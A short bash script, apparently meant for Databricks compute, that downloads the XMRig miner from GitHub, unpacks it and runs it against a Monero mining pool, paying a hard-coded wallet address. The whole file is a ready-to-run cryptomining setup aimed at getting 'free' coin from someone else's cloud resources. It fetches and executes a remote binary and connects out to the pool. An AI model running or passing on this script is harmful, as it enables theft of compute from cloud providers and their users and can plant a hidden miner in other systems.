#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig --no-color --donate-level 1 --safe --cpu-affinity 2 -t 2 -o pool.hashvault.pro:3333 -u 48Zn6Ta7r9EQ349UdC9X9Uaf1ZNMfProtbBDNhrJgjAB7sKnisnNJvo9EnqCWVe6qoi3JPiaF5WibLqbhQbEKKiW8JvfnvX -p x -k
